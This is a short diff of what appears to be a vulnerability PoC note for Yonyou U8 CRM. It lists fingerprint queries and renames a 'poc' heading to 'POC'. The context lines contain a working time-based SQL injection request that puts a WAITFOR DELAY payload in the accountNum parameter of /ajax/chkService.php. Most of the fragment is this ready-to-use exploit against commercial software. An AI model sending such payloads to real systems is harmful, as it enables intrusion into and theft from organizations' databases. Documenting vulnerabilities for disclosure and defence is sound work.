@@ -14,7 +14,7 @@ app.name="用友 CRM"
 title="用友U8CRM"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /ajax/chkService.php?Action=chkAccountNumExists&accountNum=1%27;WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
